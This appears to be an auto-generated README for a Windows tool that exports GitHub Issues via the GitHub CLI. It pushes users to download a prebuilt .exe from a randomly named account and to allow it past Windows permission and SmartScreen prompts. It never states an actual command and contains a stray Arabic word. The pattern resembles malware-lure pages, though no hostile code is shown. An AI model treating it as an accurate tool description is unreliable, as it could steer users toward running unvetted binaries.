# 🗂️ github-issues-exporter - Back Up Issues With Less Effort

[![Download github-issues-exporter](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/worshipped-confessor891/github-issues-exporter/releases)

## 🚀 What this app does

github-issues-exporter is a Windows command-line tool that helps you back up GitHub Issues with your GitHub account. It uses GitHub CLI (`gh`) sign-in, so you can export issues from a repo without copying them by hand.

It is useful when you want to:

- save issue data before a project changes
- keep a local copy of issue history
- export issue details for review
- archive open and closed issues from a repo
- work with issue data in a plain file

## 📥 Download

Visit the release page here:

[Download github-issues-exporter](https://github.com/worshipped-confessor891/github-issues-exporter/releases)

On that page, choose the latest release for Windows and download the file that matches your system. If you see more than one file, pick the one that ends in `.exe` or the Windows zip file.

## 🖥️ What you need

Before you run the app, make sure you have:

- a Windows PC
- a GitHub account
- GitHub CLI (`gh`) installed and signed in
- permission to access the repo you want to back up
- enough disk space for the exported files

If you plan to back up a large repo, make sure you have extra space. A long issue history can create a large export.

## 🛠️ How to set it up on Windows

Follow these steps in order:

1. Open the release page  
   Go to the download link above and open the latest release.

2. Get the Windows file  
   Download the file made for Windows. If the release has a zip file, save it to your Downloads folder. If it has an `.exe` file, save that file.

3. Extract the zip file if needed  
   If you downloaded a zip file, right-click it and choose Extract All. Put the files in a folder you can find later, مثل `Downloads\github-issues-exporter`.

4. Open Command Prompt  
   Press `Windows + R`, type `cmd`, then press Enter.

5. Go to the app folder  
   Use the `cd` command to move into the folder where the app files are stored. For example:  
   `cd %USERPROFILE%\Downloads\github-issues-exporter`

6. Check GitHub CLI sign-in  
   Type `gh auth status` and press Enter.  
   If you are not signed in, run `gh auth login` and follow the prompts.

7. Run the tool  
   Use the command shown in the release notes or the included files. If the app is a single `.exe`, you can usually run it from the same folder by typing its file name.

## ▶️ How to use it

The tool is made to export GitHub Issues from a repo you can access.

A common flow looks like this:

1. Open Command Prompt
2. Move to the folder with the app
3. Run the export command
4. Enter the repo name when asked
5. Choose where to save the backup
6. Wait for the export to finish

A repo name often looks like this:

`owner/repository-name`

For example:

`octocat/Hello-World`

If the tool asks for options, use the ones that match what you want to back up, such as:

- open issues
- closed issues
- all issues
- issue comments
- labels
- timestamps
- author details

## 📁 What gets exported

github-issues-exporter is built for full issue backup. A normal export can include:

- issue title
- issue number
- issue body
- labels
- state, such as open or closed
- created and updated dates
- comments
- author name
- linked data from the issue thread

The exported files are usually easy to read and store on your PC. You can use them later for review, search, or archive work.

## ⚙️ Typical output files

Depending on the release build, the app may save data in formats such as:

- JSON
- CSV
- plain text
- folder-based exports with one file per issue

If you need to open the result in a spreadsheet, CSV is the easiest format. If you want a full data backup, JSON is a good choice.

## 🔐 Sign-in and access

This tool uses GitHub CLI for sign-in. That means the app relies on your GitHub account access rather than asking for a separate password inside the tool.

If `gh` is already signed in, you can start right away.

If not, do this:

1. Open Command Prompt
2. Run `gh auth login`
3. Pick GitHub.com
4. Choose the sign-in method you prefer
5. Finish the login steps
6. Run `gh auth status` to confirm the sign-in worked

If the repo is private, your account must have permission to read it.

## 🧭 Example use case

If you manage a project and want a copy of all issues before a reset or migration, this tool can help you:

- sign in with GitHub CLI
- point the tool at the repo
- export issues to files on your PC
- keep the backup in a safe folder

You can then store the files in cloud storage, a USB drive, or another backup location.

## 🧩 Common problems

### The app does not start

- Check that you downloaded the Windows file from the release page
- Make sure the file finished downloading
- If the file is in a zip, extract it first
- Try running Command Prompt from the same folder

### GitHub sign-in fails

- Run `gh auth status`
- If needed, run `gh auth login` again
- Make sure you signed in to the right GitHub account
- Check that your account has access to the repo

### The export stops early

- Make sure your internet connection is stable
- Check whether the repo is large
- Confirm that your GitHub account can read the repo
- Try again after closing other tools that use the network

### The output folder is empty

- Check the save path you chose
- Look for hidden files if you used a file manager
- Run the export again and watch for error text in Command Prompt

## 🗂️ Suggested folder setup

To keep backups easy to find, use a folder like this:

- `Documents\GitHub Backups`
- `D:\Backups\GitHub Issues`
- `OneDrive\GitHub Archives`

You can create one folder per repo. For example:

- `GitHub Archives\owner-repo`
- `GitHub Archives\team-project`
- `GitHub Archives\client-work`

## 🧪 Good backup habits

- export the repo on a regular schedule
- keep at least two copies of the backup
- store one copy in a separate drive or cloud folder
- name folders by date
- check the export after it finishes

A simple folder name like `2026-04-19` helps you track when each backup was made.

## 🖱️ Quick start

1. Visit the release page
2. Download the Windows file
3. Install or extract it
4. Open Command Prompt
5. Make sure `gh` is signed in
6. Run the exporter
7. Save the issue backup to a folder you can find later

## 📌 Release page

[Open the latest github-issues-exporter release](https://github.com/worshipped-confessor891/github-issues-exporter/releases)

## 🧰 File handling tips

- Keep the downloaded file in a simple folder
- Do not rename files unless the release notes say you can
- If Windows asks for permission, allow the app to run
- If SmartScreen appears, check the file came from the release page
- Use a folder name with no special characters

## 🔎 What this tool is best for

This app fits users who want to:

- back up issue records
- keep a local archive
- move issue data to another system
- review issue history offline
- preserve issue threads before a repo changes

## 🧭 Before you run it again

If you plan to make another backup later:

- open the same folder
- confirm `gh` is still signed in
- use the latest release if the app has been updated
- save the new export in a dated folder